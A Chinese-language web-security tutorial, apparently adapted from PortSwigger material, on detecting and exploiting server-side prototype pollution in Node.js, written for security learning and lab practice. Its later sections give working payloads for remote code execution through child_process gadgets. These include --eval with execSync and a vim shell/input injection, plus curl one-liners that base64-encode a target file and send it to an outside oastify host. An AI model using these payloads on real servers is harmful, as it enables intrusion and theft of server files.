# 服务端原型污染

JavaScript 最初是一种设计用于在浏览器中运行的客户端语言。然而，由于服务端运行时（如广受欢迎的 Node.js）的出现，JavaScript 现在被广泛用于构建服务器、API 和其他后端应用程序。从逻辑上讲，这也意味着原型污染漏洞同样可能出现在服务端环境中。

尽管基本概念大体相同，但识别服务端原型污染漏洞并将其发展为可用的漏洞利用，仍面临一些额外的挑战。

在本节中，你将学习多种用于黑盒检测服务端原型污染的技术。我们将介绍如何高效且非破坏性地执行此操作，然后通过交互式、刻意存在漏洞的实验室，演示如何利用原型污染实现远程代码执行。

## PortSwigger 研究

本节中的部分材料和实验室基于 PortSwigger 的原创研究。如需更多技术细节以及我们如何开发这些技术的深入见解，请查阅 Gareth Heyes 随附的白皮书：

- [服务端原型污染：无 DoS 的黑盒检测](https://portswigger.net/research/server-side-prototype-pollution)

## 为什么服务端原型污染更难检测？

由于多种原因，服务端原型污染通常比客户端变种更难检测：

- **无源代码访问权限**——与客户端漏洞不同，你通常无法访问易受攻击的 JavaScript 代码。这意味着无法轻松概览存在哪些汇点或发现潜在的小工具属性。
- **缺乏开发者工具**——由于 JavaScript 在远程系统上运行，你无法像使用浏览器 DevTools 检查 DOM 那样在运行时检查对象。这意味着除非你在网站行为中引起了明显变化，否则很难判断你是否成功污染了原型。这一限制显然不适用于白盒测试。
- **DoS 问题**——在服务端环境中使用真实属性成功污染对象往往会破坏应用程序功能，甚至导致服务器完全崩溃。由于很容易无意中造成拒绝服务（DoS），在生产环境中进行测试可能是危险的。即使你确实发现了漏洞，在过程中基本上已经破坏了网站的情况下，将其发展为漏洞利用也很棘手。
- **污染持久性**——在浏览器中测试时，只需刷新页面即可撤销所有更改并重新获得干净环境。一旦污染了服务端原型，此更改会在 Node 进程的整个生命周期内持续存在，且你没有任何方法可以重置它。

在以下章节中，我们将介绍多种非破坏性技术，使你能够在这些限制下安全地测试服务端原型污染。

## 通过污染属性反射检测服务端原型污染

开发人员容易落入的一个陷阱是忘记或忽略了一个事实：JavaScript 的 `for...in` 循环会遍历对象的所有可枚举属性，包括通过原型链继承的属性。

> **注意**
> 这不包括由 JavaScript 原生构造函数设置的内置属性，因为它们在默认情况下是不可枚举的。

你可以按如下方式自行测试：

```javascript
const myObject = { a: 1, b: 2 };

// 用任意属性污染原型
Object.prototype.foo = 'bar';

// 确认 myObject 没有自己的 foo 属性
myObject.hasOwnProperty('foo'); // false

// 列出 myObject 的属性名称
for(const propertyKey in myObject){
    console.log(propertyKey);
}

// 输出: a, b, foo
```

这也适用于数组，`for...in` 循环首先遍历每个索引（本质上只是幕后的数字属性键），然后继续处理任何继承的属性。

```javascript
const myArray = ['a','b'];
Object.prototype.foo = 'bar';

for(const arrayKey in myArray){
    console.log(arrayKey);
}

// 输出: 0, 1, foo
```

在两种情况下，如果应用程序随后将返回的属性包含在响应中，这可以提供一种探测服务端原型污染的简单方法。

向应用程序或 API 提交 JSON 数据的 `POST` 或 `PUT` 请求是此类行为的首选候选，因为服务器通常会以新对象或更新对象的 JSON 表示作为响应。在这种情况下，你可以尝试如下污染全局 `Object.prototype` 并添加一个任意属性：

```http
POST /user/update HTTP/1.1
Host: vulnerable-website.com
...
{
    "user":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "__proto__":{
        "foo":"bar"
    }
}
```

如果网站存在漏洞，你注入的属性将出现在响应中的更新对象中：

```http
HTTP/1.1 200 OK
...
{
    "username":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "foo":"bar"
}
```

在极少数情况下，网站甚至可能使用这些属性动态生成 HTML，导致注入的属性在你的浏览器中被渲染。

一旦你确认服务端原型污染是可能的，你就可以寻找可用于漏洞利用的潜在小工具。任何涉及更新用户数据的功能都值得调查，因为这些功能通常涉及将传入的数据合并到应用程序中表示用户的现有对象中。如果你能向自己的用户添加任意属性，这可能会导致多种漏洞，包括权限提升。

步骤
- 探测直接设置字段
- 探测设置新属性
- 探测设置原型污染的新属性
- 探测设置应用程序的功能属性

## 无污染属性反射检测服务端原型污染

大多数时候，即使你成功污染了服务端原型对象，也不会在响应中看到受影响的属性被反射。鉴于你无法在控制台中检查对象，当尝试判断注入是否成功时，这构成了挑战。

一种方法是尝试注入与服务器潜在配置选项匹配的属性。然后你可以比较注入前后服务器的行为，以查看此配置更改是否似乎已生效。如果是这样，这是你已成功找到服务端原型污染漏洞的有力迹象。

在本节中，我们将研究以下技术：

- [状态码覆盖](#状态码覆盖)
- [JSON 空格覆盖](#json-空格覆盖)
- [字符集覆盖](#字符集覆盖)

所有这些注入都是非破坏性的，但在成功时仍会产生一致且独特的服务器行为变化。

> 这只是潜在技术的一小部分示例，旨在让你了解可能的方法。更多技术细节以及 PortSwigger Research 如何开发这些技术的深入见解，请查阅随附白皮书 [服务端原型污染：无 DoS 的黑盒检测 by Gareth Heyes](https://portswigger.net/research/server-side-prototype-pollution)。

### 状态码覆盖

像 Express 这样的服务端 JavaScript 框架允许开发者设置自定义 HTTP 响应状态码。在出错的情况下，JavaScript 服务器可能会发出通用 HTTP 响应，但在正文中包含 JSON 格式的错误对象。这是提供有关错误发生原因的额外详细信息的一种方式，而这些信息可能无法从默认的 HTTP 状态码中明显看出。

尽管有些误导，但收到 `200 OK` 响应，而响应正文却包含具有不同状态码的错误对象，这种情况也相当常见。

```http
HTTP/1.1 200 OK
...
{
    "error": {
        "success": false,
        "status": 401,
        "message": "You do not have permission to access this resource."
    }
}
```

Node 的 `http-errors` 模块包含以下用于生成此类错误响应的函数：

```javascript
function createError () {
    //...
    if (type === 'object' && arg instanceof Error) {
        err = arg
        // 兴趣点1
        status = err.status || err.statusCode || status
    } else if (type === 'number' && i === 0) {
    //...
    if (typeof status !== 'number' ||
    // 兴趣点2
    (!statuses.message[status] && (status < 400 || status >= 600))) {
        status = 500
    }
    //...
```

第一行高亮代码尝试通过从传递给函数的对象中读取 `status` 或 `statusCode` 属性来赋值 `status` 变量。如果网站开发者没有为错误显式设置 `status` 属性，你可以使用以下方式探测原型污染：

1. 找到一种触发错误响应的方法，并记录默认状态码。
    - 如 JSON 格式末尾的额外字段分隔符 `,`
2. 尝试用你自己的 `status` 属性污染原型。务必使用一个不太可能因其他原因发出的生僻状态码。
    ```json
    {
        "__proto__":{
            "status":456,
            "s_foo": "s_bar"
        },
        "n_foo": "n_bar"
    }
    ```
3. 再次触发错误响应，并检查你是否成功覆盖了状态码。

> **注意**
> 你必须选择 `400`-`599` 范围内的状态码。否则，Node 无论如何都会默认为 `500` 状态，如第二行高亮代码所示，因此你将无法判断是否污染了原型。

### JSON 空格覆盖

Express 框架提供了 `json spaces` 选项，允许你配置响应中任何 JSON 数据缩进使用的空格数。在许多情况下，开发者会保留此属性未定义，因为他们对默认值感到满意，这使得它容易通过原型链被污染。

如果你可以访问任何类型的 JSON 响应，你可以尝试用你自己的 `json spaces` 属性污染原型，然后重新发出相关请求，查看 JSON 中的缩进是否相应增加。你也可以执行相同的步骤移除缩进以确认漏洞。

这是一种特别有用的技术，因为它不依赖于特定属性是否被反射。它也非常安全，因为你可以通过将属性重置为与默认值相同的值来有效地打开和关闭污染。

尽管 Express 4.17.4 中（多年前）已修复了原型污染，但尚未升级的网站可能仍然存在漏洞。

> **注意**
> 在 Burp 中尝试此技术时，请记得切换到消息编辑器的 **Raw** 选项卡。否则，你将无法看到缩进变化，因为默认的漂亮打印视图会将其规范化。

### 字符集覆盖

Express 服务器通常实现所谓的“中间件”模块，这些模块可以在请求被传递给适当的处理函数之前对其进行预处理。例如，`body-parser` 模块通常用于解析传入请求的正文，以生成 `req.body` 对象。其中包含另一个可用于探测服务端原型污染的小工具。

注意以下代码将一个选项对象传递给 `read()` 函数，该函数用于读取请求正文以进行解析。其中一个选项 `encoding` 决定了使用哪种字符编码。这要么通过 `getCharset(req)` 函数调用从请求本身派生，要么默认为 UTF-8。

```javascript
var charset = getCharset(req) or 'utf-8'

function getCharset (req) {
    try {
        return (contentType.parse(req).parameters.charset || '').toLowerCase()
    } catch (e) {
        return undefined
    }
}

read(req, res, next, parse, debug, {
    encoding: charset,
    inflate: inflate,
    limit: limit,
    verify: verify
})
```

如果你仔细观察 `getCharset()` 函数，看起来开发者已经预料到 `Content-Type` 头可能不包含显式的 `charset` 属性，因此他们实现了一些逻辑，在这种情况下会回退到空字符串。至关重要的是，这意味着它可能通过原型污染被控制。

如果你能找到一个属性在响应中可见的对象，你可以使用它来探测源。在以下示例中，我们将使用 UTF-7 编码和一个 JSON 源。

1. 向一个在响应中被反射的属性添加一个任意 UTF-7 编码字符串。例如，UTF-7 中的 `foo` 是 `+AGYAbwBv-`。
   ```json
   {
       "sessionId":"0123456789",
       "username":"wiener",
       "role":"+AGYAbwBv-"
   }
   ```
2. 发送请求。服务器默认不会使用 UTF-7 编码，因此该字符串应以其编码形式出现在响应中。
3. 尝试用显式指定 UTF-7 字符集的 `content-type` 属性污染原型：
   ```json
   {
       "sessionId":"0123456789",
       "username":"wiener",
       "role":"default",
       "__proto__":{
           "content-type": "application/json; charset=utf-7",
           "c_foo": "c_bar"
       },
       "n_foo": "n_bar"
   }
   ```
4. 重复第一个请求。如果你成功污染了原型，UTF-7 字符串现在应在响应中被解码：
   ```json
   {
       "sessionId":"0123456789",
       "username":"wiener",
       "role":"foo",
       "c_foo": "c_bar"
   }
   ```

由于 Node 的 `_http_incoming` 模块中存在一个 bug，即使请求的实际 `Content-Type` 头包含自己的 `charset` 属性，这也能正常工作。为避免在请求包含重复头时覆盖属性，`_addHeaderLine()` 函数会在将属性转移到 `IncomingMessage` 对象之前，检查是否已存在具有相同键的属性。

```javascript
IncomingMessage.prototype._addHeaderLine = _addHeaderLine;
function _addHeaderLine(field, value, dest) {
    // ...
    } else if (dest[field] === undefined) {
        // 丢弃重复项
        dest[field] = value;
    }
}
```

如果存在，则正在处理的头将被有效丢弃。由于此检查的实现方式（可能无意中）包括通过原型链继承的属性，这意味着如果我们用自己的 `content-type` 属性污染原型，此时表示请求中真实 `Content-Type` 头的属性以及从该头派生的预期值都会被丢弃。

## 扫描服务端原型污染源

尽管手动尝试探测源有助于巩固你对漏洞的理解，但在实践中这可能重复且耗时。因此，我们为 Burp Suite 创建了 [Server-Side Prototype Pollution Scanner](https://portswigger.net/bappstore/c1d4bd60626d4178a54d36ee802cf7e8) 扩展，使你可以自动化此过程。基本工作流程如下：

1. 从 BApp Store 安装 **Server-Side Prototype Pollution Scanner** 扩展，并确保其已启用。有关如何执行此操作的详细信息，请参阅[从 BApp Store 安装扩展](https://portswigger.net/burp/documentation/desktop/extend-burp/extensions/installing/bapp-store)。
2. 使用 Burp 的浏览器浏览目标网站，尽可能多地映射内容，并在代理历史记录中积累流量。
3. 在 Burp 中，转到 **Proxy > HTTP history** 选项卡。
4. 过滤列表，仅显示范围内的项。
5. 选择列表中的所有项。
6. 右键单击你的选择，转到 **Extensions > Server-Side Prototype Pollution Scanner > Server-Side Prototype Pollution**，然后从列表中选择一种扫描技术。
7. 出现提示时，根据需要修改攻击配置，然后点击 **OK** 启动扫描。

在 Burp Suite Professional 中，扩展会通过 **Dashboard** 和 **Target** 选项卡上的 **Issue activity** 面板报告其发现的任何原型污染源。如果你使用的是 Burp Suite Community Edition，则需要转到 **Extensions > Installed** 选项卡，选择该扩展，然后监控其 **Output** 选项卡以查看任何报告的问题。

> **注意**
> 如果你不确定使用哪种扫描技术，也可以选择 **Full scan** 以使用所有可用技术运行扫描。但这将涉及发送更多请求。

## 绕过服务端原型污染的输入过滤器

网站通常尝试通过过滤 `__proto__` 等可疑键来防止或修补原型污染漏洞。这种键清理方法并非稳健的长期解决方案，因为有多种方式可以绕过它。例如，攻击者可以：

- 混淆被禁止的关键字，使其在清理过程中被遗漏。更多信息，请参阅[绕过有缺陷的键清理](https://portswigger.net/web-security/prototype-pollution/client-side#bypassing-flawed-key-sanitization)。
- 通过构造函数属性而非 `__proto__` 访问原型。更多信息，请参阅[通过构造函数进行原型污染](https://portswigger.net/web-security/prototype-pollution/client-side#prototype-pollution-via-the-constructor)。

Node 应用程序还可以分别使用命令行标志 `--disable-proto=delete` 或 `--disable-proto=throw` 来完全删除或禁用 `__proto__`。但这也可以通过构造函数技术绕过。

## 通过服务端原型污染实现远程代码执行

虽然客户端原型污染通常使易受攻击的网站暴露于 DOM XSS，但服务端原型污染可能导致远程代码执行（RCE）。在本节中，你将学习如何识别可能发生这种情况的情况，以及如何利用 Node 应用程序中的一些潜在向量。

### 识别易受攻击的请求

Node 中有多个潜在的命令执行汇点，其中许多发生在 `child_process` 模块中。这些通常由与最初能够污染原型的请求异步发生的请求调用。因此，识别这些请求的最佳方式是用一个在调用时触发与 Burp Collaborator 交互的负载来污染原型。

`NODE_OPTIONS` 环境变量允许你定义每当启动新 Node 进程时默认应使用的命令行参数字符串。由于这也是 `env` 对象上的一个属性，如果它未定义，你可以通过原型污染来控制它。

Node 的一些用于创建新子进程的函数接受一个可选的 `shell` 属性，该属性允许开发者设置一个特定的 shell（例如 bash）来运行命令。通过将其与恶意 `NODE_OPTIONS` 属性相结合，你可以以一种方式污染原型，使得每当创建新 Node 进程时，都会触发与 Burp Collaborator 的交互：

```json
"__proto__": {
    "shell":"node",
    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
}
```
- `--inspect` 调试代理

这样，你可以轻松识别何时某个请求创建了一个新的子进程，且其命令行参数可通过原型污染控制。

> **提示**
> 主机名中的转义双引号并非严格必需。但是，这可以通过混淆主机名来帮助减少误报，从而避开 WAF 和其他抓取主机名的系统。

### 通过 child_process.fork() 实现远程代码执行 —— 设置属性后触发

`child_process.spawn()` 和 `child_process.fork()` 等方法允许开发者创建新的 Node 子进程。`fork()` 方法接受一个选项对象，其中一个可能的选项是 `execArgv` 属性。这是一个包含**生成子进程时**应使用的命令行参数字符串数组。如果开发者未定义它，这也可能意味着它可以通过原型污染被控制。（即，作为**工具属性**的 `execArgv` 为条件触发：生成子进程时）

由于这个小工具允许你直接控制命令行参数，这为你提供了一些使用 `NODE_OPTIONS` 无法实现的攻击向量。特别值得关注的是 `--eval` 参数，它允许你传入将在子进程中执行的任意 JavaScript。（即，**汇**为 `--eval` 参数值的 JS 代码）这可能非常强大，甚至允许你将额外的模块加载到环境中：

```json
"execArgv": [
    "--eval=require('<module>')"
]
```

除了 `fork()`，`child_process` 模块还包含 `execSync()` 方法，它将任意字符串作为系统命令执行。通过串联这些 JavaScript 和命令注入汇点，你可以将原型污染升级为在服务器上获得完整的 RCE 能力。

```json
"execArgv": [
    "--eval=require('child_process').execSync('host id.oastify.com')"
]
```
### 通过 child_process.execSync() 实现远程代码执行

在前面的示例中，我们通过 `--eval` 命令行参数自行注入了 `child_process.execSync()` 汇点。在某些情况下，应用程序可能会自行调用此方法来执行系统命令。

与 `fork()` 一样，`execSync()` 方法也接受选项对象，该对象可能通过原型链被污染。虽然它不接受 `execArgv` 属性，但你仍然可以通过同时污染 `shell` 和 `input` 属性，将系统命令注入正在运行的子进程中：

- `input` 选项只是一个字符串，它被传递给子进程的 `stdin` 流，并由 `execSync()` 作为系统命令执行。由于还有其他提供命令的方式（例如简单地将命令作为参数传递给函数），`input` 属性本身可能未被定义。
- `shell` 选项允许开发者声明他们想要运行命令的特定 shell。默认情况下，`execSync()` 使用系统的默认 shell 来运行命令，因此这也可能未被定义。

通过污染这两个属性，你可能能够覆盖应用程序开发者意图执行的命令，并改为在你选择的 shell 中运行恶意命令。请注意，这有一些注意事项：

- `shell` 选项仅接受 shell 可执行文件的名称，不允许设置任何额外的命令行参数。
- shell 总是使用 `-c` 参数执行，大多数 shell 使用此参数让你将命令作为字符串传入。但是，在 Node 中设置 `-c` 标志会改为对提供的脚本执行语法检查，这也会阻止其执行。因此，虽然有一些变通方法，但通常使用 Node 本身作为攻击的 shell 是比较棘手的。
- 由于包含负载的 `input` 属性通过 `stdin` 传递，你选择的 shell 必须接受来自 `stdin` 的命令。

尽管它们并非真正设计为 shell，但文本编辑器 Vim 和 ex 可靠地满足了所有这些标准。如果其中任一碰巧安装在服务器上，这为 RCE 创建了一个潜在向量：

```json
"shell":"vim",
"input":":! <command>\n"
```

> **注意**
> Vim 有一个交互式提示符，并期望用户按 `Enter` 来运行提供的命令。因此，你需要通过在负载末尾包含换行符（`\n`）字符来模拟这一点，如上例所示。

此技术的一个额外限制是，你可能想要用于漏洞利用的某些工具默认也不从 `stdin` 读取数据。然而，有几种简单的方法可以绕过这一点。例如，对于 `curl`，你可以使用 `-d @-` 参数读取 `stdin` 并将内容作为 `POST` 请求的正文发送。

```js
// 管道符型
"input":":! cat target_file | base64 | curl -d @- id.oastify.com\n"

// 命令替换型
"input": ":! curl -d \"$(cat target_file | base64)\" id.oastify.com\n"

// 使用重定向符的命令替换型
"input": ":! curl -d \"$(base64 < target_file)\" id.oastify.com\n"
```

在其他情况下，你可以使用 `xargs`，它将 `stdin` 转换为可传递给命令的参数列表。
